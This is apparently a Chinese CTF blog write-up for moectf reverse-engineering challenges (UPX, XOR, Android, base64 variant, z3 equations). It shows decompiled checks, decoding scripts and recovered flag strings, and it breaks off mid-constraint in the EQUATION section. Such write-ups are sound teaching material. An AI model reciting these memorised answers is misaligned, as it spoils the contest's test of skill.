<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Yourname"><title>moectf_wp · nyyyddddn</title><meta name="description" content="REReverse入门指北12if ( *(_DWORD *)v7 == 13 )   sub_401082(aMoectfF1rstSt3, v6);

1aMoectfF1rstSt3 db &amp;#x27;moectf&amp;#123;F1rst_St3p_1s_D0ne&amp;#125;&amp;#x27;,0Ah"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"><img src="/images/logo.webp"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo@2x.webp" style="width:220px;" alt="favicon"><h3 title=""><a href="/">nyyyddddn</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/Lhcfl"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Yourname</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>moectf_wp</a></h3></div><div class="post-content"><p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverse入门指北"><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( *(_DWORD *)v7 == 13 )</span><br><span class="line">   sub_401082(aMoectfF1rstSt3, v6);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aMoectfF1rstSt3 db &#x27;moectf&#123;F1rst_St3p_1s_D0ne&#125;&#x27;,0Ah,0</span><br></pre></td></tr></table></figure>



<h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>pycdc 下载 编译</p>
<p>发现是base64变种</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>把索引表复制进去解密拿到flag</p>
<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2><p>exeinfope中看到是upx 3.9 脱壳后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = sub_140073829((__int64)inputString);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    inputString[j] ^= <span class="number">0x67</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( flag[j] != inputString[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140073973((__int64)<span class="string">&quot;try again~~&quot;</span>);</span><br><span class="line">      sub_1400723F7(<span class="number">0</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在这里可以得出只需要将flag全部数据异或上0x67u转ascii码就能拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0x1C</span>, <span class="number">0x57</span>, <span class="number">0x0F</span>, <span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x57</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x13</span>, <span class="number">0x08</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x37</span>, <span class="number">0x3F</span></span><br><span class="line">] + [<span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x46</span>] + [<span class="number">0x1A</span>] + [<span class="number">0x00</span>] * <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line">xor_result = [byte ^ <span class="number">0x67</span> <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line">ascii_output = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> xor_result])</span><br><span class="line"><span class="built_in">print</span>(ascii_output)</span><br></pre></td></tr></table></figure>



<h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = [ <span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x5C</span>,<span class="number">0x5A</span>,<span class="number">0x4D</span>,<span class="number">0x5F</span>,<span class="number">0x42</span>,</span><br><span class="line">         <span class="number">0x60</span>,<span class="number">0x56</span>,<span class="number">0x4C</span>,<span class="number">0x66</span>,<span class="number">0x52</span>,<span class="number">0x57</span>,<span class="number">0x9</span>,<span class="number">0x4E</span>,<span class="number">0x66</span>,<span class="number">0x51</span>,</span><br><span class="line">         <span class="number">0x9</span>,<span class="number">0x4E</span>,<span class="number">0x66</span>,<span class="number">0x4D</span>,<span class="number">0x9</span></span><br><span class="line">    ,<span class="number">0x66</span>,<span class="number">0x61</span>,<span class="number">0x9</span>,<span class="number">0x6B</span>,<span class="number">0x18</span>,<span class="number">0x44</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">xor_result = [byte ^ <span class="number">0x39</span> <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line">ascii_output = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> xor_result])</span><br><span class="line"><span class="built_in">print</span>(ascii_output)</span><br></pre></td></tr></table></figure>



<h2 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h2><p>根据hint1 搜索到button的id</p>
<p>搜到r.id.check找到关键代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] enc = &#123;<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>&#125;;</span><br><span class="line">    <span class="type">char</span>[] key = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(R.id.input);</span><br><span class="line">        ((Button) findViewById(R.id.check)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.doctor3.basicandroid.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (obj.length() != <span class="number">31</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;长度不对哦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">byte</span>[] bytes = obj.getBytes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((bytes[i] ^ MainActivity.<span class="built_in">this</span>.key[i % MainActivity.<span class="built_in">this</span>.key.length]) != MainActivity.<span class="built_in">this</span>.enc[i]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;好像有哪里不对&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;恭喜！回答正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i])</span><br></pre></td></tr></table></figure>

<p>这里就可以得出只要将enc ^ MainActivity.this.key[i % MainActivity.this.key.length])就可以得到bytes 上面得知bytes的长度为31</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>,</span><br><span class="line">       <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(enc[i], <span class="built_in">int</span>):</span><br><span class="line">        enc[i] = enc[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        enc[i] = <span class="built_in">ord</span>(enc[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="EQUATION"><a href="#EQUATION" class="headerlink" title="EQUATION"></a>EQUATION</h2><p>使运算全部为假就行了 把!&#x3D;改成&#x3D;&#x3D; 然后丢z3里面跑，scanf是31s，但是ida显示上是最大为24，需要修改一下长度</p>
<p>多行合并一行<a target="_blank" rel="noopener" href="https://www.lddgo.net/string/line-reduce">https://www.lddgo.net/string/line-reduce</a></p>
<p>一行按分隔符分多行<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/Char/TextSplit">https://www.toolhelper.cn/Char/TextSplit</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">v4 = [Int(<span class="string">f&#x27;v4[<span class="subst">&#123;i&#125;</span>]&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] != 0)</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] &gt;= 32)</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] &lt;= 126)</span></span><br><span class="line"></span><br><span class="line">s.add(v4[<span class="number">0</span>] == <span class="number">109</span>) <span class="comment">#m</span></span><br><span class="line">s.add(v4[<span class="number">1</span>] == <span class="number">111</span>) <span class="comment">#o</span></span><br><span class="line">s.add(v4[<span class="number">2</span>] == <span class="number">101</span>) <span class="comment">#e</span></span><br><span class="line">s.add(v4[<span class="number">3</span>] == <span class="number">99</span>)  <span class="comment">#c</span></span><br><span class="line">s.add(v4[<span class="number">4</span>] == <span class="number">116</span>) <span class="comment">#t</span></span><br><span class="line">s.add(v4[<span class="number">5</span>] == <span class="number">102</span>) <span class="comment">#f</span></span><br><span class="line">s.add(v4[<span class="number">6</span>] == <span class="number">123</span>) <span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">s.add(<span class="number">334</span> * v4[<span class="number">28</span>]+ <span class="number">100</span> * v4[<span class="number">27</span>]+ <span class="number">369</span> * v4[<span class="number">26</span>]+ <span class="number">124</span> * v4[<span class="number">25</span>]+ <span class="number">278</span> * v4[<span class="number">24</span>]+ <span class="number">158</span> * v4[<span class="number">23</span>]+ <span class="number">162</span> * v4[<span class="number">22</span>]+ <span class="number">145</span> * v4[<span class="number">19</span>]+ <span class="number">27</span> * v4[<span class="number">17</span>]+ <span class="number">91</span> * v4[<span class="number">15</span>]+ <span class="number">195</span> * v4[<span class="number">14</span>]+ <span class="number">342</span> * v4[<span class="number">13</span>]+ <span class="number">391</span> * v4[<span class="number">10</span>]+ <span class="number">204</span> * v4[<span class="number">9</span>]+ <span class="number">302</span> * v4[<span class="number">8</span>]+ <span class="number">153</span> * v4[<span class="number">7</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">382</span> * v4[<span class="number">5</span>]+ <span class="number">221</span> * v4[<span class="number">4</span>]+ <span class="number">316</span> * v4[<span class="number">3</span>]+ <span class="number">118</span> * v4[<span class="number">2</span>]+ <span class="number">295</span> * v4[<span class="number">1</span>]+ <span class="number">247</span> * v4[<span class="number">0</span>]+ <span class="number">236</span> * v4[<span class="number">11</span>]+ <span class="number">27</span> * v4[<span class="number">12</span>]+ <span class="number">361</span> * v4[<span class="number">16</span>]+ <span class="number">81</span> * v4[<span class="number">18</span>]+ <span class="number">105</span> * v4[<span class="number">20</span>]+ <span class="number">65</span> * v4[<span class="number">21</span>]+ <span class="number">67</span> * v4[<span class="number">29</span>]+ <span class="number">41</span> * v4[<span class="number">30</span>] == <span class="number">596119</span>)</span><br><span class="line">s.add(<span class="number">371</span> * v4[<span class="number">29</span>]+ <span class="number">338</span> * v4[<span class="number">28</span>]+ <span class="number">269</span> * v4[<span class="number">27</span>]+ <span class="number">312</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">25</span>]+ <span class="number">299</span> * v4[<span class="number">24</span>]+ <span class="number">235</span> * v4[<span class="number">23</span>]+ <span class="number">294</span> * v4[<span class="number">22</span>]+ <span class="number">303</span> * v4[<span class="number">21</span>]+ <span class="number">211</span> * v4[<span class="number">20</span>]+ <span class="number">122</span> * v4[<span class="number">19</span>]+ <span class="number">333</span> * v4[<span class="number">18</span>]+ <span class="number">341</span> * v4[<span class="number">15</span>]+ <span class="number">111</span> * v4[<span class="number">14</span>]+ <span class="number">253</span> * v4[<span class="number">13</span>]+ <span class="number">68</span> * v4[<span class="number">12</span>]+ <span class="number">347</span> * v4[<span class="number">11</span>]+ <span class="number">44</span> * v4[<span class="number">10</span>]+ <span class="number">262</span> * v4[<span class="number">9</span>]+ <span class="number">357</span> * v4[<span class="number">8</span>]+ <span class="number">323</span> * v4[<span class="number">5</span>]+ <span class="number">141</span> * v4[<span class="number">4</span>]+ <span class="number">329</span> * v4[<span class="number">3</span>]+ <span class="number">378</span> * v4[<span class="number">2</span>]+ <span class="number">316</span> * v4[<span class="number">1</span>]+ <span class="number">235</span> * v4[<span class="number">0</span>]+ <span class="number">59</span> * v4[<span class="number">6</span>]+ <span class="number">37</span> * v4[<span class="number">7</span>]+ <span class="number">264</span> * v4[<span class="number">16</span>]+ <span class="number">73</span> * v4[<span class="number">17</span>]+ <span class="number">126</span> * v4[<span class="number">30</span>] == <span class="number">634009</span>)</span><br><span class="line">s.add(<span class="number">337</span> * v4[<span class="number">29</span>]+ <span class="number">338</span> * v4[<span class="number">28</span>]+ <span class="number">118</span> * v4[<span class="number">27</span>]+ <span class="number">82</span> * v4[<span class="number">26</span>]+ <span class="number">239</span> * v4[<span class="number">21</span>]+ <span class="number">58</span> * v4[<span class="number">20</span>]+ <span class="number">304</span> * v4[<span class="number">19</span>]+ <span class="number">330</span> * v4[<span class="number">18</span>]+ <span class="number">377</span> * v4[<span class="number">17</span>]+ <span class="number">306</span> * v4[<span class="number">16</span>]+ <span class="number">221</span> * v4[<span class="number">13</span>]+ <span class="number">345</span> * v4[<span class="number">12</span>]+ <span class="number">124</span> * v4[<span class="number">11</span>]+ <span class="number">272</span> * v4[<span class="number">10</span>]+ <span class="number">270</span> * v4[<span class="number">9</span>]+ <span class="number">229</span> * v4[<span class="number">8</span>]+ <span class="number">377</span> * v4[<span class="number">7</span>]+ <span class="number">373</span> * v4[<span class="number">6</span>]+ <span class="number">297</span> * v4[<span class="number">5</span>]+ <span class="number">112</span> * v4[<span class="number">4</span>]+ <span class="number">386</span> * v4[<span class="number">3</span>]+ <span class="number">90</span> * v4[<span class="number">2</span>]+ <span class="number">361</span> * v4[<span class="number">1</span>]+ <span class="number">236</span> * v4[<span class="number">0</span>]+ <span class="number">386</span> * v4[<span class="number">14</span>]+ <span class="number">73</span> * v4[<span class="number">15</span>]+ <span class="number">315</span> * v4[<span class="number">22</span>]+ <span class="number">33</span> * v4[<span class="number">23</span>]+ <span class="number">141</span> * v4[<span class="number">24</span>]+ <span class="number">129</span> * v4[<span class="number">25</span>]+ <span class="number">123</span> * v4[<span class="number">30</span>] == <span class="number">685705</span>)</span><br><span class="line">s.add(<span class="number">367</span> * v4[<span class="number">29</span>]+ <span class="number">55</span> * v4[<span class="number">28</span>]+ <span class="number">374</span> * v4[<span class="number">27</span>]+ <span class="number">150</span> * v4[<span class="number">24</span>]+ <span class="number">350</span> * v4[<span class="number">23</span>]+ <span class="number">141</span> * v4[<span class="number">22</span>]+ <span class="number">124</span> * v4[<span class="number">21</span>]+ <span class="number">366</span> * v4[<span class="number">20</span>]+ <span class="number">230</span> * v4[<span class="number">19</span>]+ <span class="number">307</span> * v4[<span class="number">18</span>]+ <span class="number">191</span> * v4[<span class="number">17</span>]+ <span class="number">153</span> * v4[<span class="number">12</span>]+ <span class="number">383</span> * v4[<span class="number">11</span>]+ <span class="number">145</span> * v4[<span class="number">10</span>]+ <span class="number">109</span> * v4[<span class="number">9</span>]+ <span class="number">209</span> * v4[<span class="number">8</span>]+ <span class="number">158</span> * v4[<span class="number">7</span>]+ <span class="number">221</span> * v4[<span class="number">6</span>]+ <span class="number">188</span> * v4[<span class="number">5</span>]+ <span class="number">22</span> * v4[<span class="number">4</span>]+ <span class="number">146</span> * v4[<span class="number">3</span>]+ <span class="number">306</span> * v4[<span class="number">2</span>]+ <span class="number">230</span> * v4[<span class="number">1</span>]+ <span class="number">13</span> * v4[<span class="number">0</span>]+ <span class="number">287</span> * v4[<span class="number">13</span>]+ <span class="number">257</span> * v4[<span class="number">14</span>]+ <span class="number">137</span> * v4[<span class="number">15</span>]+ <span class="number">7</span> * v4[<span class="number">16</span>]+ <span class="number">52</span> * v4[<span class="number">25</span>]+ <span class="number">31</span> * v4[<span class="number">26</span>]+ <span class="number">355</span> * v4[<span class="number">30</span>] == <span class="number">557696</span>)</span><br><span class="line">s.add(<span class="number">100</span> * v4[<span class="number">29</span>]+ <span class="number">191</span> * v4[<span class="number">28</span>]+ <span class="number">362</span> * v4[<span class="number">27</span>]+ <span class="number">55</span> * v4[<span class="number">26</span>]+ <span class="number">210</span> * v4[<span class="number">25</span>]+ <span class="number">359</span> * v4[<span class="number">24</span>]+ <span class="number">348</span> * v4[<span class="number">21</span>]+ <span class="number">83</span> * v4[<span class="number">20</span>]+ <span class="number">395</span> * v4[<span class="number">19</span>]+ <span class="number">350</span> * v4[<span class="number">16</span>]+ <span class="number">291</span> * v4[<span class="number">15</span>]+ <span class="number">220</span> * v4[<span class="number">12</span>]+ <span class="number">196</span> * v4[<span class="number">11</span>]+ <span class="number">399</span> * v4[<span class="number">8</span>]+ <span class="number">68</span> * v4[<span class="number">7</span>]+ <span class="number">84</span> * v4[<span class="number">6</span>]+ <span class="number">281</span> * v4[<span class="number">5</span>]+ <span class="number">334</span> * v4[<span class="number">4</span>]+ <span class="number">53</span> * v4[<span class="number">3</span>]+ <span class="number">399</span> * v4[<span class="number">2</span>]+ <span class="number">338</span> * v4[<span class="number">0</span>]+ <span class="number">18</span> * v4[<span class="number">1</span>]+ <span class="number">148</span> * v4[<span class="number">9</span>]+ <span class="number">21</span> * v4[<span class="number">10</span>]+ <span class="number">174</span> * v4[<span class="number">13</span>]+ <span class="number">36</span> * v4[<span class="number">14</span>]+ <span class="number">2</span> * v4[<span class="number">17</span>]+ <span class="number">41</span> * v4[<span class="number">18</span>]+ <span class="number">137</span> * v4[<span class="number">22</span>]+ <span class="number">24</span> * v4[<span class="number">23</span>]+ <span class="number">368</span> * v4[<span class="number">30</span>] == <span class="number">538535</span>)</span><br><span class="line">s.add(<span class="number">188</span> * v4[<span class="number">29</span>]+ (v4[<span class="number">26</span>] * <span class="number">2</span> ** <span class="number">7</span>)+ <span class="number">93</span> * v4[<span class="number">25</span>]+ <span class="number">248</span> * v4[<span class="number">24</span>]+ <span class="number">83</span> * v4[<span class="number">23</span>]+ <span class="number">207</span> * v4[<span class="number">22</span>]+ <span class="number">217</span> * v4[<span class="number">19</span>]+ <span class="number">309</span> * v4[<span class="number">16</span>]+ <span class="number">16</span> * v4[<span class="number">15</span>]+ <span class="number">135</span> * v4[<span class="number">14</span>]+ <span class="number">251</span> * v4[<span class="number">13</span>]+ <span class="number">200</span> * v4[<span class="number">12</span>]+ <span class="number">49</span> * v4[<span class="number">11</span>]+ <span class="number">119</span> * v4[<span class="number">10</span>]+ <span class="number">356</span> * v4[<span class="number">9</span>]+ <span class="number">398</span> * v4[<span class="number">8</span>]+ <span class="number">303</span> * v4[<span 